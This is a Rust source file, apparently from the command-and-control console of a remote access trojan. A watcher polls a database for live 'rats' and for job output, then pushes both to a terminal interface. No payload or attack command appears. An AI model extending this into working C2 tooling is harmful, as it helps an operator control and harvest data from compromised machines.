use crate::badtui::gui::Command;

pub struct Watcher {
    gui_tx: tokio::sync::mpsc::Sender<Command>,
    db_pool: crate::persistence::Pool,
}

impl Watcher {
    pub fn new(
        gui_tx: tokio::sync::mpsc::Sender<Command>,
        db_pool: crate::persistence::Pool,
    ) -> Self {
        Watcher { gui_tx, db_pool }
    }

    pub async fn run(&self) -> Result<(), Box<dyn std::error::Error>> {
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(500));
        let mut last_id = 0;

        interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

        // TODO separate tasks?
        loop {
            interval.tick().await;

            let rats_query =
                sqlx::query!("SELECT rat_id FROM rats WHERE alive = true ORDER BY first_seen ASC")
                    .fetch_all(&self.db_pool.reader);

            let output_query = sqlx::query!(
                "SELECT output_id, job_id, output FROM jobs_output WHERE output_id > ? ORDER BY output_id ASC",
                last_id,
            )
                .fetch_all(&self.db_pool.reader);

            let (rats, output) = tokio::join!(rats_query, output_query);

            // TODO these things seem like they can take a lot of time, should probably(?) not do this in an async context
            let rats_vec: Vec<String> = rats?.iter().map(|rat| rat.rat_id.to_string()).collect();
            self.gui_tx
                .send(crate::badtui::gui::Command::SetRats(rats_vec))
                .await?;

            for record in output? {
                let message = format!("Output from job #{}: {}", record.job_id, record.output);
                self.gui_tx
                    .send(crate::badtui::gui::Command::SendOutput(message))
                    .await?;

                last_id = record.output_id;
            }
        }
    }
}
